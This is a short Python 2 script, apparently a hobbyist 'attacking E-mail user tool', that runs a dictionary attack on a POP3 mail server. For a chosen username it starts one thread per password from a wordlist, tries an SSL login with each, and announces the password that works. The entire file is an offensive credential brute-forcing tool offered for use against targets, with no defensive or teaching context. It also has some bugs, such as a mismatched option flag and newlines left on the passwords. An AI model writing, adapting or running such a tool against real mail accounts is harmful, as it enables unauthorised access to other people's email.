#!/usr/bin/env python


# Powered by yelvxiuge

import poplib
import optparse
import os
from threading import *

scrLock = Semaphore(value = 1)


def login(server,user,password):
	hr = '-'*30+'\n'
	try:
		target = poplib.POP3_SSL(server)
	except Exception,e:
		scrLock.acquire()
		print hr
		print '[-]'+str(e)+'\n'
		print hr
		scrLock.release()
		return 0
	scrLock.acquire()
	print '$'*30+':\n\n'
	message=target.getwelcome()
	print "[+]Message from sever:"+message
	message = target.user(user)
	print "[+]Message from server for username:"+message
	scrLock.release()
	try:
		message = target.pass_(password)
		scrLock.acquire()
		print "[+]message from server for password:"+message
		print "[+]password "+password+"is tested"
		print "!"*30+"Mession Complete!!This password is %s !!" % password
	except Exception,e:
		scrLock.acquire()
		print hr
		print "[+] ERROR"+str(e)
		print hr
	finally:
		scrLock.release()
		target.quit()
def main():
	usage = "usage %prog -H < The address of target pop server > -u <the username you want to attack> -f <poassword dictionary>"
	mark = " atke V1.0:attacking E-mial user tool ,powered by China Peking"

	parse = optparse.OptionParser( mark+usage )
	parse.add_option('-H',dest='targetHost',type= 'string',help= 'specify targethost')
	parse.add_option('-u',dest='targetUsername',type = 'string', help = 'specify user you want to fuck')
	parse.add_option('-F',dest = 'passFile',type = 'string',help ='specify password dictionary')
	(options,args)=parse.parse_args()
	targetHost = options.targetHost
	targetUsername =options.targetUsername
	passFile = options.passFile

	if(targetHost == None)|(targetUsername==None):
		print '[-] You must specify a pop server host and username'
		exit(0)

	if not os.path.isfile(passFile):
		print '[-]the password dictionary is not exit';
		exit(0)
	control(targetHost,targetUsername,passFile)
	
def control(server,user,passFile):
	passwords = open(passFile)
	for password in passwords:
		th = Thread(target=login,args=(server,user,password))
		th.start()
	#	print '[+]'+password[0:-1]+' is tested:'
	passwords.close()

if __name__=='__main__':
	main()
